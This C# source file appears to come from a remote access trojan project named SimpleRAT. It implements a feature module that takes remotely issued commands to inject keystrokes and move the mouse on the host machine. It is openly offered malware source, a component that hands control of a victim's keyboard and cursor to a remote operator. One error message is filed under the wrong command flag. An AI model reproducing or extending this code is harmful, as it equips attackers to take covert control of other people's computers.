using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SimpleRAT.Communication;

namespace SimpleRAT.Features
{
    public class InputFeature : BaseFeature
    {

        public static InputFeature Instance => new InputFeature();

        protected InputFeature() : base(Commands.SendKeys | Commands.MoveMouse) { }

        public override void Handle(Context context)
        {
            if (context.Request.Command.HasFlag(Commands.SendKeys))
            {
                if (context.Request.Arguments.ContainsKey("input.keys"))
                    SendKeys.SendWait(context.Request.Arguments["input.keys"]);
                else
                    context.Response.AddError(Commands.MoveMouse, "Missing parameter \"input.keys\"");
            }

            if (context.Request.Command.HasFlag(Commands.MoveMouse))
            {
                if (context.Request.Arguments.ContainsKey("input.mouse.x") && context.Request.Arguments.ContainsKey("input.mouse.y"))
                {
                    if (!int.TryParse(context.Request.Arguments["input.mouse.x"], out int x) || !int.TryParse(context.Request.Arguments["input.mouse.y"], out int y))
                        context.Response.AddError(Commands.MoveMouse, "Invalid format");
                    else
                        Cursor.Position = new System.Drawing.Point(x, y);
                }
                else
                {
                    context.Response.AddError(Commands.MoveMouse, "Missing parameters \"input.mouse.x\" and \"input.mouse.y\"");
                }
            }
        }
    }
}
